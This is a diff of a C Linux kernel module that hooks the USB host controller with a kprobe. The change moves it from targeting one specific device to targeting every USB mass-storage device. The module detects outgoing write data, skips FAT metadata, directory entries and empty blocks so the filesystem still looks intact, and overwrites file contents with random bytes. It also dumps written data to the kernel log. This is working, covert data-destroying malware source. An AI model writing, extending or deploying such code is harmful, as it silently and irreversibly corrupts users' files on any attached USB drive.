@@ -7,45 +7,82 @@
 #include <linux/highmem.h> 
 #include <linux/usb/storage.h>
 #include <linux/msdos_fs.h>
+#include <scsi/scsi_proto.h>
 
-#define VENDOR_ID   0x0dd8
-#define PRODUCT_ID  0x3801
 #define VOLUME_NAME "MYFLASH"
+
+#define IS_VALID_CBW(cbw) \
+    ((cbw) && (le32_to_cpu((cbw)->Signature) == US_BULK_CB_SIGN))
+
+#define IS_MEANINGFUL_CBW(cbw) \
+    ((((cbw)->Flags & 0x3F) == 0) && \
+     ((cbw)->Lun < 1) && \
+     ((cbw)->Length >= 1 && (cbw)->Length <= 16) && \
+     (((cbw)->Flags & 0x40) == 0))
+
 static struct kprobe kp_submit;
 
-static ssize_t find_first_nonzero(const unsigned char *buffer, size_t size)
+static int is_fsinfo(const struct fat_boot_fsinfo *buffer) 
 {
-    for (size_t i = 0; i < size; i++) 
-    {
-        if (buffer[i] != 0)
-            return i;
-    }
-    return -1;
+    return IS_FSINFO(buffer);
 }
 
-static int is_fat_table(const unsigned char *buffer) 
-{    
-    if (buffer[0] == 0xF8 && 
-        buffer[1] == 0xFF && 
-        buffer[2] == 0xFF && 
-        buffer[3] == 0x0F &&
-        buffer[4] == 0xFF && 
-        buffer[5] == 0xFF && 
-        buffer[6] == 0xFF && 
-        buffer[7] == 0x0F)
-            return 1;
-    return 0;
+static int is_root_dir(const struct msdos_dir_entry *dir)
+{
+    return (dir->attr & ATTR_VOLUME) && 
+           (strncmp(dir->name, VOLUME_NAME, strlen(VOLUME_NAME)) == 0);
+}
+
+#define BYTES_SIZE_ENTRY 4
+
+static int is_fat_table(const u32 *fat_entries, size_t size) 
+{
+    u32 prev = fat_entries[0];
+    for (size_t i = 1; i < size / BYTES_SIZE_ENTRY; i++) 
+    {
+        if (fat_entries[i] == EOF_FAT32) break;
+        if (fat_entries[i] == prev && prev == 0)
+        {
+            continue;
+        }
+        if (fat_entries[i] - 1 != prev && prev != EOF_FAT32)
+        {
+            return 0;
+        }
+        prev = fat_entries[i];
+    }
+    return 1;
+}
+
+static int is_path(const char *buf)
+{
+    return strncmp(buf, MSDOS_DOT, MSDOS_NAME) == 0;
+}
+
+static int is_empty(char *buf, size_t size)
+{
+    for (size_t i = 0; i < size; i++)
+        if (buf[i] != 0) return 0;
+    return 1;
+}
+
+static int is_trash_info(const char *buf) 
+{
+    return memcmp(buf, "[Trash Info]", 12) == 0;
 }
 
 static void process(struct urb *urb)
 {
     struct scatterlist *sg;
     int i;
+    void *virt_addr;
+    struct page *page;
+    size_t len;
+
     for_each_sg(urb->sg, sg, urb->num_sgs, i) 
     {
-        void *virt_addr;
-        size_t len = sg->length;   
-        struct page *page = sg_page(sg);
+        len = sg->length;   
+        page = sg_page(sg);
         if (page) 
         {
             virt_addr = kmap_local_page(page);
@@ -53,26 +90,30 @@ static void process(struct urb *urb)
             {
                 virt_addr += sg->offset;
                 printk(KERN_INFO "  SG[%d]: len=%zu\n", i, len);
-                if (memcmp(virt_addr, VOLUME_NAME, strlen(VOLUME_NAME)) == 0 ||
-                    is_fat_table(virt_addr) ||        // fat table?
-                    ((char*)virt_addr)[11] == 0x10 || // directory?
-                    ((char*)virt_addr)[0] == 0xE5 || // is free element?
-                    *(__le32 *)&((char*)virt_addr)[0] == cpu_to_le32(FAT_FSINFO_SIG1) ||
-                    find_first_nonzero(virt_addr, len) == -1)
+                print_hex_dump(KERN_INFO, "    Data: ", 
+                    DUMP_PREFIX_OFFSET, 16, 1,
+                    virt_addr, min(len, 1024), true);                
+                if (
+                    is_root_dir(virt_addr) ||
+                    is_fat_table(virt_addr, len) || 
+                    is_fsinfo(virt_addr) ||
+                    is_path(virt_addr) ||
+                    is_empty(virt_addr, len) ||
+                    is_trash_info(virt_addr)
+                )
                 {   
                     goto unmap;
                 }
 
-                print_hex_dump(KERN_INFO, "    Data: ", 
-                            DUMP_PREFIX_OFFSET, 16, 1,
-                            virt_addr, min(len, 512), true);
                 get_random_bytes(virt_addr, len);
+
                 if (urb->dev->bus && urb->dev->bus->sysdev) 
                 {
-                    dma_sync_single_for_device(urb->dev->bus->sysdev,
-                                        sg_dma_address(sg),
-                                        len,
-                                        DMA_TO_DEVICE);
+                    dma_sync_single_for_device(
+                        urb->dev->bus->sysdev,
+                        sg_dma_address(sg),
+                        len,
+                        DMA_TO_DEVICE);
                 }
 unmap:
                 virt_addr -= sg->offset;
@@ -87,7 +128,49 @@ unmap:
         {
             printk(KERN_INFO "  SG[%d]: NULL page\n", i);
         }
+    }
+}
 
+static void print_urb(struct urb *urb) {
+    printk(KERN_INFO "---- URB_INFO ----\n");
+    pr_info("transfer_buffer_length: %d;\n"
+            "transfer_buffer: %d;\n"
+            "num_sgs: %d;\n"
+            "URB_NO_TRANSFER_DMA_MAP: %d;\n"
+            "transfer_dma: %llu;\n",
+        urb->transfer_buffer_length, 
+        urb->transfer_buffer ? 1 : 0,
+        urb->num_sgs,
+        urb->transfer_flags & URB_NO_TRANSFER_DMA_MAP,
+        urb->transfer_dma
+    );
+}
+
+static void print_cdb(struct bulk_cb_wrap *bcb)
+{
+    printk(KERN_INFO "CDB (Length=%d):", bcb->Length);
+    for (int i = 0; i < bcb->Length && i < 16; i++) {
+        printk(KERN_CONT " %02x", bcb->CDB[i]);
+    }
+    printk(KERN_CONT "\n");
+}
+
+static int is_write_operation(struct bulk_cb_wrap *cbw)
+{
+    switch (cbw->CDB[0])
+    {
+    case WRITE_6:
+    case WRITE_10:
+    case WRITE_12:
+    case WRITE_VERIFY_12:
+    case WRITE_LONG_2:
+    case WRITE_16:
+    case WRITE_VERIFY_16:
+    case WRITE_32:
+    case WRITE_VERIFY_32:
+        return 1;
+    default:
+        return 0;
     }
 }
 
@@ -95,30 +178,49 @@ static int handler_usb_hcd_link_urb_to_ep_pre(struct kprobe *p, struct pt_regs *
 {
     struct urb *urb = (struct urb *)regs->si;
     if (!urb || !urb->dev)
+    {
         return 0;
+    }
     struct usb_device *udev = urb->dev;
+    struct usb_host_config *c = udev->config;
+    struct usb_interface_descriptor *d = &c->intf_cache[0]->altsetting->desc;
 
-    if (udev->descriptor.idVendor == VENDOR_ID && 
-        udev->descriptor.idProduct == PRODUCT_ID && 
-        usb_urb_dir_out(urb) == 1) 
-        {
-
-        int is_flag = 0;
-        if (urb->transfer_flags & URB_NO_TRANSFER_DMA_MAP) 
-        {
-            is_flag = 1;
+    if (d->bInterfaceClass == USB_CLASS_MASS_STORAGE && 
+        d->bInterfaceProtocol == USB_PR_BULK && 
+        d->bInterfaceSubClass == USB_SC_SCSI &&
+        usb_urb_dir_out(urb)) 
+    {         
+        if (urb->transfer_buffer) {
+            if (urb->transfer_buffer_length > 0) {
+                printk(KERN_INFO "Process TransferBuffer\n");
+                struct bulk_cb_wrap *cbw = (struct bulk_cb_wrap *)urb->transfer_buffer;
+                if (IS_VALID_CBW(cbw)       && 
+                    is_write_operation(cbw) &&
+                    IS_MEANINGFUL_CBW(cbw)  && 
+                    cbw->DataTransferLength
+                ) 
+                {
+                    print_cdb(cbw);
+                    pr_info("It is a write command." 
+                            "Due to BulkOnly, next URB will be with real data\n");
+                }
+                else {
+                    pr_info("It is not a cbw in transfer_buffer." 
+                            "Need to process(transfer_buffer)\n");
+                }
+            }
+            else goto invalidURB;
         }
-
-        printk(KERN_INFO "%d, %d, %d, %s\n", is_flag, urb->transfer_buffer_length, urb->num_sgs, (char*) urb->transfer_buffer);
-        
-        struct bulk_cb_wrap *cbw = (struct bulk_cb_wrap *)urb->transfer_buffer;
-        if (cbw && 
-            cbw->Signature && 
-            le32_to_cpu(cbw->Signature) == US_BULK_CB_SIGN) 
-        {
-            return 0;
+        else {
+            if (urb->num_sgs > 0) {
+                printk(KERN_INFO "Process SG\n");
+                process(urb);
+            }
+            else {
+invalidURB:
+                printk(KERN_INFO "Invalid URB\n");
+            }
         }
-        process(urb);
     }
     return 0;
 }
